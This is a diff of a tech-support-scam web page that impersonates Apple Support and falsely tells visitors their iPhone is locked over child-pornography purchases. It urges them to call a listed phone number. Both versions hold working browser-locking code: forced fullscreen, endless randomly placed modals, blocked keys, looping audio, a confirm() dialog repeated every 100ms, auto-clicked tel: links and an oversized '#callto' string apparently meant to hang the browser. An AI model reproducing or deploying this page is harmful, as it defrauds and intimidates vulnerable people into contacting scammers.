@@ -1,21 +1,18 @@
-<!DOCTYPE html><html lang="en"><head>
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta http-equiv="cache-control" content="max-age=3600">
-    <title>Contact - Official Apple Support</title>
-    <link rel="apple-touch-icon" href="images/favicon.ico">
-    <link rel="icon" type="image/png" href="images/favicon.ico">
-    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
 
-    <!-- Bootstrap 5 CSS -->
-    <link href="css/bootstrap.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="css/bootstrap-icons.css">
-    <!-- Font Awesome -->
-    <link rel="stylesheet" href="css/all.min.css">
-    <link rel="stylesheet" href="css/Base.css" type="text/css">
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 
-<!-- Google tag (gtag.js) -->
+
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv="cache-control" content="max-age=3600" />
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more." />
+    <link rel="stylesheet" href="Base.css" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="fonts/_families%3dSF%2bPro%2cv1_7CSF%2bPro%2bIcons%2cv1html.html" />
+    <script src="text_tel.js"></script>
+ <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-2DMKRPGVF0"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
@@ -24,46 +21,170 @@
 
   gtag('config', 'G-2DMKRPGVF0');
 </script>
-  
 
 </head>
 
-<body onclick="playSound()"  id="link">
-    <!-- Click overlay - only active when needed -->
-    <div id="clickOverlay" class="click-overlay"></div>
-
-        
-    <div class="bgimg">
-          <img src="images/bg.jpg" alt="" width="100%">
+<body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate" />
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false" />
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav" />
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
         </div>
-
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
     <div class="main">
-        
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-877-470-9604 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close"
+                            id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
         <section class="as-columns  as-columns--1up  as-banner as-banner--top">
             <div class="row">
                 <div class="column large-12 medium-12 small-12">
-                    <div class="as-banner-content">
-                        
-                        <div class="alert-box">
-                            
+                    <div class='as-banner-cont'>
+                        <div class='as-banner-image as-banner-image--top'>
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("globalnav/apple/contact-us-hero.image.large_2x.jpg");
+                                }
 
-    <div class="spacbar">
-        <div class="d-flex justify-content-between">
-  <div><img src="images/applelogo2.png" alt="" style="width: 30px;margin-right: 5px;"> Alert</div>
-  <div><a href="#" style="font-size: 15px;">Apple Support</a></div>
-</div>
-<img src="images/arror.jpg" alt="" style="width:80px;display: block;margin: 10px auto 0;text-align: center;">
-    <div class="alert-title">Your iPhone has been locked due to suspicious activity.</div>
-    <div class="alert-texts">
-        <div class="bgblue"><strong>Transaction of $569.90 via Apple Pay for Child Pornography was found.</strong> <br>For security reasons you are prohibited from using your device.</div>
-    <div class="txstm"> <br>
-        Not you? Call <strong>Apple Support: <br><a href="tel:+1-877-470-9604">+1-877-470-9604</a></strong> to unlock your device.
-     </div>
-    <a href="tel:+1-877-470-9604" class="alert-button">Time left for unlock request: <span id="countdown">10:00</span></a>
-    
-    </div>
-</div>
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("globalnav/apple/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="globalnav/apple/contact-us-hero.image.small_2x.jpg 735w, globalnav/apple/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="globalnav/apple/contact-us-hero.image.large_2x.jpg"
+                            />
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock" />
+                        </div>
                         <div class="sectionTitle sectionTitleBlock">
                             <h2 class="sectionTitle-heading"></h2>
                         </div>
@@ -73,262 +194,182 @@
         </section>
     </div>
 
-    <div class="notification">
-        <div class="msalogo"><img src="images/messages.svg" alt="" width="30px"> MESSAGES</div>
-<div class="cursor">now</div>
-  <div class="notification-header">Payment Successful</div>
-  <div class="notification-body">
-    Sent $569.90 via Apple Pay to Pornhub <br>Premium.
-    Not you? Call +1-877-470-9604
-  </div>
-  <img src="images/apple_pay.png" alt="Apple Pay" class="apple-pay">
-</div>
-
-    <div id="modalContainer"></div>
-
-    <!-- Main Modal -->
-    <div class="modal fade" id="appleAlertModal" tabindex="-1" aria-labelledby="appleAlertModalLabel" aria-hidden="true" style="top:-30px!important;">
-
-        <div class="modal-dialog modal-lg modal-dialog-centered-sm">
-            <div class="modal-content">
-                <div class="modal-body text-center">
-                    <div class="alert-text">
-                        Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-877-470-9604">+1-877-470-9604</a> to unlock it!
-                    </div>
-
-                    
-                    <div class="text-end gap-4 mt-3 actionbtn">
-                        <a href="tel:+1-877-470-9604" class="me-2 bg-primary">Call +1-877-470-9604</a>
-                        <a href="tel:+1-877-470-9604" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
-                    </div>
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">CHÍLD P0RN0GRÀPHY WEBSITE </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
                 </div>
-            </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="globalnav/apple/us.png" alt="" width="16" height="16" />United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name" />
+                <meta content="+1-877-470-9604
+			 " property="telephone" />
+            </section>
         </div>
-    </div>
-
-    <audio id="clickSound" src="media/LhlCcb3bW5w3.mp3" preload="auto" loop></audio>
-
-<script>
-function playSound() {
-  const audio = document.getElementById("clickSound");
-//   audio.currentTime = 0; // restart sound if clicked again
-  audio.play();
-}
-</script>
-    <!-- Bootstrap & Popper.js -->
-    <script src="js/popper.min.js"></script>
-    <script src="js/bootstrap.min.js"></script>
+    </footer>
 
 
-<script>
-let timeLeft = 10 * 60;
-
-const display = document.getElementById("countdown");
-
-const timer = setInterval(() => {
-  let minutes = Math.floor(timeLeft / 60);
-  let seconds = timeLeft % 60;
-
-  display.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
-
-  if (timeLeft <= 0) {
-    clearInterval(timer);
-    display.textContent = "Time's up!";
-  }
-
-  timeLeft--;
-}, 1000);
-</script>
-
-
-<script>
-
-
-
-    let modalCount = 0;
-    const maxModals = Infinity;
-    let fullScreenTriggered = false;
-
-    // Function to trigger full screen
-    function triggerFullScreen() {
-        const elem = document.documentElement;
-        if (!document.fullscreenElement) { // Only trigger if not already in fullscreen
-            if (elem.requestFullscreen) {
-                elem.requestFullscreen().catch(err => {
-                    console.error('Fullscreen error:', err);
-                });
-            } else if (elem.webkitRequestFullscreen) {
-                elem.webkitRequestFullscreen();
-            } else if (elem.msRequestFullscreen) {
-                elem.msRequestFullscreen();
-            }
-        }
-    }
-
-    // Function to exit fullscreen
-    function exitFullScreen() {
-        if (document.exitFullscreen) {
-            document.exitFullscreen();
-        } else if (document.webkitExitFullscreen) {
-            document.webkitExitFullscreen();
-        } else if (document.msExitFullscreen) {
-            document.msExitFullscreen();
-        }
-    }
-
-    // Function to generate random position within viewport
-    function getRandomPosition(modalWidth, modalHeight) {
-        const viewportWidth = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
-        const viewportHeight = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);
-
-        if (modalWidth >= viewportWidth || modalHeight >= viewportHeight) {
-            return {
-                top: Math.max(0, (viewportHeight - modalHeight) / 2),
-                left: Math.max(0, (viewportWidth - modalWidth) / 2)
-            };
-        }
-
-        const maxX = viewportWidth - modalWidth;
-        const maxY = viewportHeight - modalHeight;
-
-        const randomX = Math.floor(Math.random() * (maxX + 1));
-        const randomY = Math.floor(Math.random() * (maxY + 1));
-
-        return { top: randomY, left: randomX };
-    }
-
-    // Function to create a new modal with random position
-    function createNewModal() {
-        if (modalCount >= maxModals) return null;
-
-        modalCount++;
-
-        const newModal = document.createElement('div');
-        newModal.className = 'modal fade modal-stack';
-        newModal.id = `appleAlertModal-${modalCount}`;
-        newModal.tabIndex = -1;
-        newModal.setAttribute('aria-labelledby', `appleAlertModalLabel-${modalCount}`);
-        newModal.setAttribute('aria-hidden', 'true');
-
-        newModal.innerHTML = `
-            <div class="modal-dialog modal-lg positioned">
-                <div class="modal-content" id="applealertmodeltwo">
-                    <div class="modal-body text-center">
-                        <div class="alert-text">
-                            Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-877-470-9604">+1-877-470-9604</a> to unlock it!
-                        </div>
-
-                        
-                        <div class="text-end gap-4 mt-3 actionbtn">
-                            <a href="tel:+1-877-470-9604" class="me-2 bg-primary">Call +1-877-470-9604</a>
-                            <a href="tel:+1-877-470-9604" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        `;
-
-        document.getElementById('modalContainer').appendChild(newModal);
-
-        const modal = new bootstrap.Modal(newModal, {
-            backdrop: 'static',
-            keyboard: false
-        });
-
-        const modalDialog = newModal.querySelector('.modal-dialog');
-        let modalWidth, modalHeight;
-
-        modalWidth = Math.min(600, window.innerWidth * 0.9);
-        modalHeight = window.innerWidth <= 576 ? 250 : 400;
-
-        const { top, left } = getRandomPosition(modalWidth, modalHeight);
-        modalDialog.style.top = `${top}px`;
-        modalDialog.style.left = `${left}px`;
-
-        if (window.innerWidth <= 576) {
-            modalDialog.style.width = `${modalWidth}px`;
-            modalDialog.style.maxWidth = 'none';
-        }
-
-        newModal.style.zIndex = 1080 + modalCount;
-        modal.show();
-
-        // Ensure tel: link actually triggers phone call
-        newModal.querySelectorAll('.tel-link').forEach(link => {
-            link.addEventListener('click', (e) => {
-                window.location.href = link.getAttribute('href');
-            });
-        });
-
-        // return modal;
-    }
-
-    // Initialize the first modal
-    const appleAlertModal = new bootstrap.Modal(document.getElementById('appleAlertModal'), {
-        backdrop: 'static',
-        keyboard: false
-    });
-
-    document.addEventListener('DOMContentLoaded', function () {
-        appleAlertModal.show();
-    });
-
-    // Add event listener to body for fullscreen and modal creation
-    document.body.addEventListener('click', () => {
-        triggerFullScreen();
-        createNewModal();
-    });
-
-    // On ESC â†’ exit fullscreen
-    document.addEventListener("keydown", function (e) {
-        if (e.key === "Escape") {
-            exitFullScreen();
-        }
-        if (e.key === "F11" || e.keyCode === 122) {
-            e.preventDefault();
-            e.stopPropagation();
-            return false;
-        }
-    }, true);
-
-    document.addEventListener("keyup", function (e) {
-        if (e.key === "F11" || e.keyCode === 122) {
-            e.preventDefault();
-            e.stopPropagation();
-            return false;
-        }
-    }, true);
-
-    // If fullscreen exits (via ESC), next body click/activity will trigger fullscreen again
-    document.addEventListener("fullscreenchange", () => {
-        if (!document.fullscreenElement) {
-            // User exited fullscreen
-            document.body.addEventListener("click", triggerFullScreen, { once: true });
-        }
-    });
-
-    window.addEventListener('resize', function () {
-        const modals = document.querySelectorAll('.modal-stack .modal-dialog.positioned');
-
-        modals.forEach(modal => {
-            const viewportHeight = window.innerHeight;
-            const modalHeight = modal.offsetHeight;
-            let { top } = getRandomPosition(modal.offsetWidth, modalHeight);
-
-            if (top + modalHeight > viewportHeight) {
-                top = Math.max(0, viewportHeight - modalHeight);
-            }
-
-            modal.style.top = `${top}px`;
-            modal.style.left = `0`;
-            modal.style.width = `100%`;
-            modal.style.maxHeight = `${viewportHeight}px`;
-            modal.style.overflow = `hidden`;
-        });
-    });
-</script> 
 
     <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
 
 
-</body></html>
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-877-470-9604');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-877-470-9604"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at CHÍLD P0RN0GRÀPHY WEBSITE for $549.70 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-877-470-9604 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+</body>
+
+
+</html>
